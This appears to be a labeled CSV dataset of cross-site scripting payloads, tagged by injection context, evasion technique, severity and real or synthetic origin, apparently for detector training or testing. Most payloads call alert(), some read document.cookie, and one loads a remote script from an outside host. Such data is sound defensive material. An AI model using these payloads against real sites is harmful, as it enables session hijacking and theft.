payload,context,technique,severity,length,source
"""><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt('XSS')>",tag_injection,synthetic,medium,57,synthetic
"<font draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</font>",event_handler,none,medium,84,real
"<form onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</form>",event_handler,none,medium,69,real
"<animate oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<h1 oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</h1>",event_handler,none,medium,56,real
"<cite onclick=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,65,real
"<big onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,67,real
"<nav oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('AnonKryptiQuz');+ADw-/SCRIPT+AD4-",event_handler,case_variation,medium,137,real
<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>,event_handler,none,medium,72,real
"<blockquote onmousedown=""alert(1)"">AnonKryptiQuz</blockquote>",event_handler,none,medium,61,real
"<audio draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",event_handler,none,medium,88,real
<area onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</area><input value=clickme>,event_handler,none,medium,99,real
' oNloAd=AleRt('XSS') ',attribute_escape,synthetic,medium,23,synthetic
"<script>throw onerror=alert,1</script>",script_injection,none,low,38,real
"""><Svg onMouSeeNteR=cOnsOle.loG(dOcuMenT.cOokIe)>",tag_injection,synthetic,medium,49,synthetic
"<img2 draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</img2>",event_handler,none,medium,86,real
<big onpointerenter=alert(1) style=display:block>AnonKryptiQuz</big>,event_handler,none,medium,68,real
j&#97;vascr	ipt:alert(location.hash),js_uri,synthetic,medium,36,synthetic
"<AnonKryptiQuz STYLE=""Xss:expressionfalert('AnonKryptiQuz'))"">",attribute_escape,case_variation,medium,62,real
"<rp draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,57,real
<svG oNtoGglE=cOnsOle.loG(lOcaTioN.hAsh)/>,tag_injection,synthetic,medium,42,synthetic
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,96,real
"<bdo oncut=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",event_handler,none,medium,57,real
"<th onmousemove=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,45,real
"<dir oncontextmenu=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,49,real
"<content onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></content>",event_handler,none,medium,287,real
"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",attribute_escape,url_encoding,medium,271,real
<BODY ONLOAD=javascript:alert(3213)>,event_handler,case_variation,medium,36,real
"<samp ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</samp>",event_handler,none,medium,89,real
<link onpointerenter=alert(1) style=display:block>AnonKryptiQuz</link>,event_handler,none,medium,70,real
"<listing onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,75,real
"<s onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</s>",event_handler,none,medium,59,real
"<tfoot draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,66,real
' oNtoGglE=aLerT(1) ',attribute_escape,synthetic,medium,21,synthetic
'><script>alert(123)</script>,script_injection,none,medium,29,real
"<a href=""\x1Ajavascript:javascript:alert(5770)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
%22><svg onerror=prompt(document.domain)>,tag_injection,synthetic,medium,41,synthetic
"{{!ready && (ready = true) && (
!call
? $$watchers[0].get(toString.constructor.prototype)
: (a = apply) &&
(apply = constructor) &&
(valueOf = call) &&
(''+''.toString(
'F = Function.prototype;' +
'F.apply = F.a;' +
'delete F.a;' +
'delete F.valueOf;' +
'alert(1);'
)));}}",template_injection,template,medium,272,real
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",event_handler,none,medium,117,real
<video><source onerror=alert(1) src=1></video>,event_handler,none,medium,46,real
<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>,event_handler,none,medium,66,real
"<acronym draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</acronym>",event_handler,none,medium,72,real
<svg onb&#101;gin=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,57,synthetic
"<head draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,86,real
"<tbody ondblclick=""alert(1)"">AnonKryptiQuz</tbody>",event_handler,none,medium,50,real
<image3 onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><center id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></center>",event_handler,none,medium,182,real
<font onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,66,real
"<main onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</main>",event_handler,none,medium,84,real
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",event_handler,none,medium,111,real
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,event_handler,none,medium,72,real
"<plaintext onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",event_handler,none,medium,75,real
"""><svg onload=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,53,synthetic
"""><svg/onload=alert(/AnonKryptiQuz/)",event_handler,none,medium,36,real
"<acronym draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</acronym>",event_handler,none,medium,92,real
"<acronym onmouseout=""alert(1)"">AnonKryptiQuz</acronym>",event_handler,none,medium,54,real
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,event_handler,none,medium,46,real
""" onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,69,synthetic
<img src=xss onerror=alert(1)>,event_handler,none,medium,30,real
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>,script_injection,none,low,59,real
"<style>@keyframes slidein {}</style><article style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></article>",event_handler,none,medium,174,real
"<svg onmouseover=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,60,synthetic
"<spacer ondblclick=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,52,real
"<<SCRIPT>alert(""AnonKryptiQuz"");//\<</SCRIPT>",script_injection,case_variation,medium,45,real
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></footer>",event_handler,none,medium,116,real
"<template onmouseenter=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,58,real
"%27 onclick=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,54,synthetic
<cite id=x tabindex=1 onfocus=alert(1)></cite>,event_handler,none,medium,46,real
"<dir onmouseleave=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,48,real
<svg onpointerup=alert(1) style=display:block>AnonKryptiQuz</svg>,event_handler,none,medium,65,real
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",js_uri,case_variation,medium,120,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt('XSS')>"")",dom_sink,synthetic,medium,74,synthetic
"<div draggable=""true"" contenteditable>drag me</div><image2 ondrop=alert(1) contenteditable style=display:block>drop here</image2>",event_handler,none,medium,129,real
<dfn contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,event_handler,none,medium,66,real
"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,64,real
<button popovertarget=x>Click me</button><acronym onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</acronym>,event_handler,none,medium,110,real
"<option onmouseup=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,51,real
"""><svg onmouseover=prompt(document.cookie)>",tag_injection,synthetic,medium,43,synthetic
"""`'><script>\x7Ejavascript:alert(1992)</script>",script_injection,none,medium,47,real
"<sCrIpT>(function(){var a=[97,108,101,114,116];var",script_injection,case_variation,low,50,real
"eval(""\u0061lert(document.domain)"")",dom_sink,synthetic,medium,35,synthetic
""" onmouseover=confirm('XSS') """,attribute_escape,synthetic,medium,30,synthetic
&#x0003c;,generic,html_entity,low,9,real
"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",generic,html_entity,medium,54,real
document.write(%22<img src=x onerror=alert(document.cookie)>%22),dom_sink,synthetic,medium,64,synthetic
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;,js_uri,none,medium,97,real
"<marquee onstart=""alert('AnonKryptiQuz')"">Start</marquee>",event_handler,none,medium,57,real
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=print()></caption>",event_handler,none,low,116,real
<svG oNerRor=prOmpT(dOcuMenT.dOmaIn)/>,tag_injection,synthetic,medium,38,synthetic
"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></progress>",event_handler,none,medium,176,real
"""><svg onload=alert&amp;#x27;#x00000040""1"")>",event_handler,none,low,44,real
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",event_handler,none,medium,97,real
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>,event_handler,none,medium,75,real
<svg onfocus=prompt(location.hash)/>,tag_injection,synthetic,medium,36,synthetic
<datalist onpointermove=alert(1) style=display:block>AnonKryptiQuz</datalist>,event_handler,none,medium,77,real
"%22 onfocus=alert(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape,synthetic,medium,62,synthetic
<time onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",event_handler,none,medium,101,real
"<bdi onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdi>",event_handler,none,medium,81,real
<isindex type=submit formaction=javascript:alert(1)>,generic,protocol,medium,52,real
"""`'><script>\xE2\x80\x80javascript:alert(9348)</script>",script_injection,none,medium,55,real
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationstart=""alert(1)""></basefont>",event_handler,none,medium,103,real
"<ol draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,82,real
%22 onfocus=prompt(document.cookie) %22,attribute_escape,synthetic,medium,39,synthetic
"<strong ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,93,real
""" onfocus=console.log(document.cookie) """,attribute_escape,synthetic,medium,40,synthetic
"<dialog onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,69,real
"<isindex draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</isindex>",event_handler,none,medium,72,real
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable style=display:block>drop here</keygen>",event_handler,none,medium,133,real
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationend=""alert(1)""></style>",event_handler,none,medium,95,real
"""><svg onmouseover=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
javaScRipt:Alert(‘1’),js_uri,none,medium,21,real
""" onmouseenter=console.log(document.domain) """,attribute_escape,synthetic,medium,45,synthetic
"<var draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</var>",event_handler,none,medium,84,real
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,94,real
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionstart=alert(1)></ins>",event_handler,none,medium,106,real
<video2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</video2><input value=clickme>,event_handler,none,medium,112,real
"<style>:target {color: red;}</style><td id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></td>",event_handler,none,medium,107,real
<header onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></basefont>",event_handler,none,medium,186,real
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,81,real
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",event_handler,none,medium,109,real
<iframe2 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,61,real
"<input2 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</input2>",event_handler,none,medium,87,real
"<style onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,71,real
eval(630038579..toString(30))(1),dom_sink,encoding,high,32,real
<th onpointerenter=alert(1) style=display:block>AnonKryptiQuz</th>,event_handler,none,medium,66,real
"<script>prompt(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,54,synthetic
"<math><x href=""javascript:alert(1)"">blah",js_uri,protocol,medium,40,real
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,event_handler,none,medium,60,real
"<bdo onmousemove=""alert(1)"">AnonKryptiQuz</bdo>",event_handler,none,medium,47,real
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,event_handler,none,medium,50,real
"<style>:target {transform: rotate(180deg);}</style><s id=x style=""transition:transform 2s"" ontransitionrun=print()></s>",event_handler,none,low,119,real
"<command ondblclick=""alert(1)"">AnonKryptiQuz</command>",event_handler,none,medium,54,real
%E5%98%8D%E5%98%8A%20<script>alert(1)</script>,script_injection,url_encoding,medium,46,real
“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;,event_handler,url_encoding,high,104,real
<svg onclick=prompt(document.cookie)/>,tag_injection,synthetic,medium,38,synthetic
<image2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</image2><input value=clickme>,event_handler,none,medium,112,real
"<wbr onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",event_handler,none,medium,67,real
"%22 ontoggle=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,54,synthetic
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,84,real
"""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",event_handler,none,medium,50,real
"<optgroup ondblclick=""alert(1)"">AnonKryptiQuz</optgroup>",event_handler,none,medium,56,real
<audio controls src=1 onfocus=alert(1) autofocus>,event_handler,none,medium,49,real
"<article onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</article>",event_handler,none,medium,72,real
vbscript&#00058;confirm(1);,generic,html_entity,medium,27,real
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",event_handler,none,low,112,real
"<article onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,87,real
"<center draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</center>",event_handler,none,medium,70,real
"<pre draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</pre>",event_handler,none,medium,64,real
"<rtc oncut=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",event_handler,none,medium,57,real
"<cite oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,71,real
"<bdo onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,79,real
"<fieldset form=""javascript:alert('AnonKryptiQuz')"">",js_uri,none,medium,51,real
<xmp onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<style onmouseup=""alert(1)"">AnonKryptiQuz</style>",event_handler,none,medium,49,real
"<style>:target {color:red;}</style><em id=x style=""transition:color 1s"" ontransitionend=alert(1)></em>",event_handler,none,medium,102,real
<button popovertarget=x>Click me</button><iframe onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</iframe>,event_handler,none,medium,108,real
'''><SCRIPT>alert(1)',script_injection,case_variation,medium,21,real
<button popovertarget=x>Click me</button><var onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</var>,event_handler,none,medium,102,real
"<style>@keyframes slidein {}</style><custom tags style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></custom tags>",event_handler,none,medium,182,real
"<set onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,67,real
<figcaption onpointerenter=alert(1) style=display:block>AnonKryptiQuz</figcaption>,event_handler,none,medium,82,real
"<header onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</header>",event_handler,none,medium,71,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style=""position:absolute;"" onanimationcancel=""print()""></summary>",event_handler,none,low,183,real
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",event_handler,none,medium,109,real
"<img src=x onerror=""js:abc='al'+'ert()';eval(abc)"" />",event_handler,encoding,high,53,real
/><svg src=x onload=confirm(document.domain);>,event_handler,none,medium,46,real
"<datalist onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",event_handler,none,medium,69,real
<sub onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</sub><input value=clickme>,event_handler,none,medium,97,real
"<style>@keyframes slidein {}</style><input4 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></input4>",event_handler,none,medium,172,real
"<script>/*/confirm(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,58,synthetic
"<style>@keyframes slidein {}</style><head style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></head>",event_handler,none,medium,168,real
"<s onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</s>",event_handler,none,medium,78,real
%22><svg onerror=console.log(document.domain)>,tag_injection,synthetic,medium,46,synthetic
123456%22/%3E%3Cmath%3E%3Carchy%20href=Ja%26Tab;vascript%26colon;console.error(1)%3EARCHY%3C/archy%3E%3C/math%3E%3C!--,generic,url_encoding,low,118,real
<col onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,65,real
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,91,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""print()""></menuitem>",event_handler,none,low,185,real
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></img>",event_handler,none,medium,124,real
"<p id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></p>",event_handler,none,medium,78,real
"<dialog draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,90,real
"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>",event_handler,none,medium,113,real
<u id=x tabindex=1 onfocusin=alert(1)></u>,event_handler,none,medium,42,real
<scr	ipt>/x/alert('XSS')</scr	ipt>,script_injection,synthetic,medium,34,synthetic
"javascript:`//""//\""//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`",event_handler,comment_injection,medium,140,real
"<video src=x onerror=""prompt(xss)"">",event_handler,none,medium,35,real
%22-confirm(1)-%22,generic,url_encoding,medium,18,real
<a href=javascript:confirm()>click here,js_uri,none,medium,39,real
""" ontoggle=confirm(1) """,attribute_escape,synthetic,medium,23,synthetic
&#x3C;img src=1 onerror=alert(1)&#x3E;,event_handler,html_entity,medium,38,real
""" onmous&#101;&#101;nt&#101;r=consol&#101;.log('XSS') """,attribute_escape,synthetic,medium,55,synthetic
"<svg onmous&#101;ov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,84,synthetic
"<div onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</div>",event_handler,none,medium,59,real
"<svg x=""10"">",tag_injection,none,low,12,real
"<output onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</output>",event_handler,none,medium,69,real
"<output onmouseout=""alert(1)"">AnonKryptiQuz</output>",event_handler,none,medium,52,real
"""%3E%3Csvg onclick=alert('XSS')%3E",tag_injection,synthetic,medium,34,synthetic
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",event_handler,encoding|case_variation,medium,69,real
"javascript:alert()//'//""//\""//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>",event_handler,none,medium,169,real
' onb&#101;gin=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,51,synthetic
%3Csvg onmouseenter=alert(1)%3E,tag_injection,synthetic,medium,31,synthetic
"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dd>",event_handler,none,medium,108,real
"<bgsound onmouseenter=""alert(1)"">AnonKryptiQuz</bgsound>",event_handler,none,medium,56,real
""" onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,59,synthetic
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></del>",event_handler,none,medium,110,real
"SetTimEouT(""ProMpt(StRinG.fRomChaRCoDe(88,83,83))"",0)",dom_sink,synthetic,medium,53,synthetic
"<svg onclick=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<style>:target {color: red;}</style><noembed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noembed>",event_handler,none,medium,117,real
"<optgroup oncut=""alert(1)"" contenteditable>AnonKryptiQuz</optgroup>",event_handler,none,medium,67,real
"<basefont oncontextmenu=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,59,real
"<center onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,73,real
"<p onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,64,real
"<nav onmouseleave=""alert(1)"">AnonKryptiQuz</nav>",event_handler,none,medium,48,real
""" onload=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
"<animate onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animate>",event_handler,none,medium,87,real
"<a style=""-o-link:'javascript:javascript:alert(8271)';-o-link-source:current"">X",js_uri,none,medium,79,real
"<mark onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,81,real
"<section draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,70,real
<scr	ipt>prompt(location.hash)</scr	ipt>,script_injection,synthetic,medium,40,synthetic
"<param onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</param>",event_handler,none,medium,69,real
<track onpointerenter=alert(1) style=display:block>AnonKryptiQuz</track>,event_handler,none,medium,72,real
"""><svg on&#101;rror=prompt(1)>",tag_injection,synthetic,medium,30,synthetic
"<nav draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,83,real
<svg on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,61,synthetic
<map onpointerleave=alert(1) style=display:block>AnonKryptiQuz</map>,event_handler,none,medium,68,real
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('AnonKryptiQuz')></OBJECT>,js_uri,case_variation,medium,124,real
<link onfocus=alert(1) id=x tabindex=1 style=display:block>,event_handler,none,medium,59,real
<svG oNerRor=prOmpT(lOcaTioN.hAsh)/>,tag_injection,synthetic,medium,36,synthetic
<tr onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</tr><input value=clickme>,event_handler,none,medium,95,real
"""%3E%3Csvg onmouseenter=alert(location.hash)%3E",tag_injection,synthetic,medium,47,synthetic
"<optgroup onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</optgroup>",event_handler,none,medium,72,real
"""><svg onmouseover=\u0061lert(1)>",tag_injection,synthetic,medium,33,synthetic
<dfn onpointermove=alert(1) style=display:block>AnonKryptiQuz</dfn>,event_handler,none,medium,67,real
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E,event_handler,url_encoding,medium,50,real
"<nextid onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</nextid>",event_handler,none,medium,67,real
<rtc onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<font onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</font>",event_handler,none,medium,63,real
"<img src=something onauxclick=""new Function `al\ert\`xss\``"">",event_handler,none,low,61,real
' oNtoGglE=cOnsOle.loG(1) ',attribute_escape,synthetic,medium,27,synthetic
<img srcset=1 onerror=alert(1)>,event_handler,none,medium,31,real
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>",event_handler,none,medium,103,real
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></noscript>",event_handler,none,medium,120,real
<input onpointerout=alert(1) style=display:block>AnonKryptiQuz</input>,event_handler,none,medium,70,real
"<object onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</object>",event_handler,none,medium,72,real
